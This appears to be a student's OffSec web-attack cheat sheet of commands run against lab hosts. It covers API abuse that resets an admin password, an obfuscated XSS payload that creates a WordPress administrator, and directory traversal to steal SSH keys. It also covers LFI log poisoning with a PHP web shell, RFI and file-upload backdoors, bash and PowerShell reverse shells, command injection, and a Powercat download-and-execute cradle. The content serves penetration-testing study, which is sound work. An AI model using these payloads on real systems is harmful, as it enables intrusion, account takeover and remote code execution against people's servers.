# Web Application Assessment Tools

- Nmap
	- sudo nmap -p80  -sV 192.168.50.20
	- sudo nmap -p80 --script=http-enum 192.168.50.20

- Wappalyzer
	- Looks at webapp's tech stack
- Gobuster
	- gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
		- -x for file type
- Burp
- Firefox Debugger
## Enumerating and Abusing APIs
- Example API name
	- /api_name/v1
- Gobuster pattern brute force
	- {GOBUSTER}/v1 > pattern
	- {GOBUSTER}/v2 >> pattern
	- gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
- Inspect the API with curl
	- curl -i http://192.168.50.16:5002/users/v1
- Use curl to POST
	- curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
		- -d
			-  JSON data
		- -H
			- specifying Content-type to json
	- curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
	- curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
	- curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
	- curl  \
	  'http://192.168.50.16:5002/users/v1/admin/password' \
	  -H 'Content-Type: application/json' \
	  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
	  -d '{"password": "pwned"}'
- PUT method
	- curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
  - curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
- Send curl responses to burp
	- _--proxy 127.0.0.1:8080_
## XSS Attacks
- Javascript
	- Retreive Nonce
		- var ajaxRequest = new XMLHttpRequest();
			var requestURL = "/wp-admin/user-new.php";
			var nonceRegex = /ser" value="([^"]*?)"/g; ajaxRequest.open("GET", requestURL, false);
			ajaxRequest.send();
			var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
			var nonce = nonceMatch[1];
	-  create new admin user
		- var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
		ajaxRequest = new XMLHttpRequest();
		ajaxRequest.open("POST", requestURL, true);
		ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		ajaxRequest.send(params);
- JS Compress
	- minify
- Encode the JS
	- function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
		let encoded = encode_to_javascript('insert_minified_javascript')
		console.log(encoded)
	- Decode & execute with curl
		- ```curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
`
## Common Web Attacks
- /var/www/html
	- Web servers root directory
- Directory Traversal Attack
	1. curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
	2. ssh -i dt_key -p 2222 offsec@mountaindesserts.co
- Local File Inclusion (LFI)
	- Example 1
		- curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
		- <?php echo system($_GET['cmd']); ?>
		- ../../../../../../../../../var/log/apache2/access.log
		- - ../../../../../../../../../var/log/apache2/access.log&cmd=ps
	- URL Encoding ---> Space = %20
	- Reverse Shell
		- bash -i >& /dev/tcp/192.168.45.174/4444 0>&1
	- -c to make sure it executes in bash
		- bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
		- URL encoding
			- bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
		- Start Netcat listener
			- nc -lvnp 4444
	- XAMPP
		- Log Files
			- C:\xampp\apache\logs\
- PHP Wrappers
	- php://filter --> read content
		- Unwrapped request
			- curl http://mountaindesserts.com/meteor/index.php?page=admin.php
		- PHP wrapped
			- curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
		- Base 64 encoded
			- curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
		- Decode
			- echo [$encoded http response] | base64 -d
				- -d --> decode
	- data:// ---> execute code
		- **** [allow_url_include] setting must be enabled ****
		- embed URL-encoded PHP
			- curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
		- Base 64 encoded
			1. echo -n '<?php echo system($_GET["cmd"]);?>' | base64
			2. curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
- Remote File Inclusion (RFI)
	- Example:
		- Using simple-backdoor.php
			- [kali] /usr/share/webshells/php/
		- Startup web server
			- python3 -m http.server 80
		- Use curl with included file
			- curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
- File Upload Vulnerability
	- Example:
		- curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
		- Powershell
			1. PowerShell on Kali
				-  pwsh
			2. Create text variable to store reverse shell one-liner
				- PS > `$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'`
			3. Use convert method and unicode property to encode
				- `$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
				- `$EncodedText =[Convert]::ToBase64String($Bytes)`
				- `$EncodedText`
				- `exit`
			4. Use curl to execute
				- curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
					- -enc
						- for base64 encoding
- Using Non-Executable Files
	- Example
		- ssh-keygen
		- cat fileup.pub > authorized keys
		- ![[Pasted image 20240225221910.png]]
		- rm ~/.ssh/known_hosts
		- ssh -p 2222 -i fileup root@mountaindesserts.com
- OS Command Injection
	- Example
		- Using "Archive" as vulnerability
			- curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
			- curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
			- curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
				- If Linux, wont say linux
		- URL Encode two commands
			- curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
		- Determine if Powershell or CMD
			- (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
		- URL Encode
			- curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
		- Powercat
			- Powershell Netcat listener in kali

			- Copy Powercat to home directory
				- cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
			- Start up py server
				- python3 -m http.server 80
			-  Start up  netcat
				- nc -lvnp 4444
			- Use PowerShell download cradle to load Powercat function contained in powercat.ps1 && use PowerCat to create reverse shell
				- IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
			- Encoded
				- curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive